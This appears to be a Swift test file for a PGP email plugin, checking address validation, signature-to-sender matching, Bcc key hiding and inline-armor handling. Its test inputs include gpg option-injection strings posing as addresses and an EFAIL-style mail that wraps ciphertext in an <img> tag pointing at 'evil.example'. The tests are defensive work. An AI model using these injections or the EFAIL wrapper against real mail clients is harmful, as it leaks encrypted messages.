import Testing
import Foundation
@testable import PGPMailCore
@testable import PGPMailXPC

private func tempHome() throws -> URL {
    let h = URL(fileURLWithPath: "/tmp/pgh-\(UUID().uuidString.prefix(8))")
    try FileManager.default.createDirectory(at: h, withIntermediateDirectories: true, attributes: [.posixPermissions: 0o700])
    return h
}
private func cleanup(_ h: URL) {
    let p = Process(); p.executableURL = GPGTestSupport.gpgconf
    p.arguments = ["--kill", "gpg-agent"]; p.environment = ["GNUPGHOME": h.path]; try? p.run(); p.waitUntilExit()
    try? FileManager.default.removeItem(at: h)
}
private func gen(_ g: GPG, _ uid: String) throws {
    _ = try g.run(["--passphrase", "", "--pinentry-mode", "loopback", "--quick-generate-key", uid, "default", "default", "never"])
}
private func home() throws -> (GPG, URL) {
    let h = try tempHome()
    var g = try GPG.locate(); g.environment = ["GNUPGHOME": h.path]
    return (g, h)
}

@Test func addressesThatLookLikeOptionsAreRejected() throws {
    #expect(AddressExtractor.isValid("alice@example.org"))
    #expect(AddressExtractor.isValid("a.b+tag@sub.example.org"))
    for bad in ["--output=/tmp/x@example.org", "-r@example.org", "a b@example.org", "<a@example.org>", "a@b", "a@example.org\n--yes", "=a@example.org", ""] {
        #expect(!AddressExtractor.isValid(bad), "\(bad)")
    }
    let (g, h) = try home(); defer { cleanup(h) }
    try gen(g, "Alice <alice@example.org>")
    #expect(KeyRing.encryptionKeyFingerprint(for: "--list-options=x@example.org", using: g) == nil)
    #expect(KeyRing.locateEncryptionKey(for: "--keyserver=x@example.org", using: g, wkd: true) == nil)
    // fingerprints that are not hex never reach gpg
    #expect(throws: PGPMIMEEncoder.EncodeError.self) {
        try PGPMIMEEncoder(gpg: g).encode(Data("From: a@example.org\n\nx\n".utf8), options: .init(signerFingerprint: nil, recipientFingerprints: ["--output=/tmp/x"]))
    }
}

@Test func statusLinesAreSeparateFromStderr() throws {
    let (g, h) = try home(); defer { cleanup(h) }
    try gen(g, "Alice <alice@example.org>")
    let r = try g.run(["--armor", "--trust-model", "always", "-r", "alice@example.org", "--encrypt"], stdin: Data("x".utf8))
    let d = try g.run(["--decrypt"], stdin: r.stdout)
    #expect(d.status.contains(.decryptionOkay))
    #expect(!d.stderr.contains("[GNUPG:]"))
    // A status line smuggled into stderr-like text is not parsed from stderr at all.
    #expect(GPGResult(stdout: Data(), stderr: "[GNUPG:] GOODSIG AAAA Mallory", exitCode: 0, statusText: "").status.isEmpty)
}

@Test func bccRecipientsAreHidden() throws {
    let (g, h) = try home(); defer { cleanup(h) }
    try gen(g, "Alice <alice@example.org>"); try gen(g, "Bob <bob@example.org>")
    let alice = try #require(KeyRing.encryptionKeyFingerprint(for: "alice@example.org", using: g))
    let bob = try #require(KeyRing.encryptionKeyFingerprint(for: "bob@example.org", using: g))
    let mail = "From: alice@example.org\nTo: alice@example.org\nSubject: x\nContent-Type: text/html\n\n<p>hi</p>\n"
    let out = try PGPMIMEEncoder(gpg: g).encode(Data(mail.utf8), options: .init(
        signerFingerprint: nil, recipientFingerprints: [alice], hiddenRecipientFingerprints: [bob]))
    let payload = try #require(MIMEEntity(data: out).multipartParts()?.last.map { MIMEEntity(string: $0).body })
    let r = try g.run(["--decrypt"], stdin: Data(payload.utf8))
    let ids = r.status.compactMap { if case .encryptedTo(let k) = $0 { k } else { nil } }
    #expect(ids.count == 2)
    #expect(ids.contains("0000000000000000"))                       // Bob's key ID is not disclosed
    #expect(r.status.contains(.decryptionOkay))
}

@Test func goodSignatureFromSomeoneElseDoesNotMatchSender() throws {
    let (g, h) = try home(); defer { cleanup(h) }
    try gen(g, "Mallory <mallory@example.net>")
    let key = try #require(try KeyRing.secretKeys(using: g).first)
    func signed(from: String) throws -> PGPMIME.Decoded {
        let mail = "From: \(from)\nTo: bob@example.org\nSubject: x\nContent-Type: text/plain\n\nBitte ueberweisen.\n"
        let out = try PGPMIMEEncoder(gpg: g).encode(Data(mail.utf8), options: .init(signerFingerprint: key.fingerprint, recipientFingerprints: [], format: .pgpMIME))
        return try PGPMIME(gpg: g).decode(out)
    }
    let spoofed = try signed(from: "Chef <chef@example.org>")
    #expect(spoofed.signature?.state == .good)
    #expect(spoofed.signature?.matchesSender == false)
    #expect(spoofed.signature?.emails == ["mallory@example.net"])
    let honest = try signed(from: "Mallory <MALLORY@example.net>")
    #expect(honest.signature?.matchesSender == true)
}

@Test func quotedArmorIsIgnored() throws {
    let (g, h) = try home(); defer { cleanup(h) }
    let mail = "From: a@example.org\nContent-Type: text/plain\n\nDu schriebst:\n> -----BEGIN PGP MESSAGE-----\n> abc\n> -----END PGP MESSAGE-----\n"
    #expect(!PGPMIME.hasInlineArmor(Data(mail.utf8)))
    let d = try PGPMIME(gpg: g).decode(Data(mail.utf8))
    #expect(d.message == Data(mail.utf8))
}

@Test func textAroundInlineBlockIsMarkedAsUnprotected() throws {
    let (g, h) = try home(); defer { cleanup(h) }
    try gen(g, "Alice <alice@example.org>")
    let key = try #require(try KeyRing.secretKeys(using: g).first)
    let sig = try g.run(["--armor", "--clearsign", "-u", key.fingerprint], stdin: Data("Ich stimme zu.\n".utf8))
    let armor = String(decoding: sig.stdout, as: UTF8.self)
    let mail = "From: alice@example.org\nContent-Type: text/plain; charset=iso-8859-1\n\nNICHT von Alice: \u{E4}\n\(armor)"
    let d = try PGPMIME(gpg: g).decode(mail.data(using: .isoLatin1)!)
    let text = String(decoding: d.message, as: UTF8.self)
    let begin = try #require(text.range(of: "[OpenPGP: Beginn des signierten Teils"))
    let end = try #require(text.range(of: "[OpenPGP: Ende des signierten Teils]"))
    let inside = try #require(text.range(of: "Ich stimme zu."))
    let outside = try #require(text.range(of: "NICHT von Alice: ä"))          // Latin-1 prefix re-encoded to UTF-8
    #expect(begin.upperBound <= inside.lowerBound && inside.upperBound <= end.lowerBound)
    #expect(outside.upperBound <= begin.lowerBound)

    // A block that is the whole body needs no markers.
    let whole = try PGPMIME(gpg: g).decode(Data("From: alice@example.org\nContent-Type: text/plain\n\n\(armor)".utf8))
    #expect(!String(decoding: whole.message, as: UTF8.self).contains("[OpenPGP:"))
}

@Test func inlineCiphertextNextToHTMLIsNotDecrypted() throws {
    let (g, h) = try home(); defer { cleanup(h) }
    try gen(g, "Alice <alice@example.org>")
    let enc = try g.run(["--armor", "--trust-model", "always", "-r", "alice@example.org", "--encrypt"], stdin: Data("GEHEIM".utf8))
    let armor = String(decoding: enc.stdout, as: UTF8.self)
    // EFAIL-style wrapper: attacker HTML around a stolen ciphertext.
    let mail = "From: m@example.net\nContent-Type: multipart/mixed; boundary=\"B\"\n\n--B\nContent-Type: text/html\n\n<img src=\"http://evil.example/\n--B\nContent-Type: text/plain\n\n\(armor)\n--B\nContent-Type: text/html\n\n\">\n--B--\n"
    let d = try PGPMIME(gpg: g).decode(Data(mail.utf8))
    #expect(!d.wasEncrypted)
    #expect(!String(decoding: d.message, as: UTF8.self).contains("GEHEIM"))
}

@Test func staleSignatureStatusIsNotGood() {
    let s = GPGStatus.parse("[GNUPG:] EXPKEYSIG ABCD Alice <a@example.org>\n[GNUPG:] VALIDSIG FFFF x\n")
    #expect(PGPMIME.signature(from: s)?.state == .stale)
    #expect(PGPMIME.signature(from: GPGStatus.parse("[GNUPG:] REVKEYSIG ABCD Alice\n"))?.state == .stale)
}

@Test func serviceTreatsBccAsHiddenAndReportsMissingKeys() throws {
    let (g, h) = try home(); defer { cleanup(h) }
    try gen(g, "Alice <alice@example.org>")
    let cfg = KeyConfig(wkdLookup: false)
    let st = GPGService.encodingStatus(.init(from: "alice@example.org", recipients: ["alice@example.org"], hiddenRecipients: ["nobody@example.org"], sign: true, encrypt: true), gpg: g, config: cfg)
    #expect(!st.canEncrypt && st.addressesFailingEncryption == ["nobody@example.org"])
}
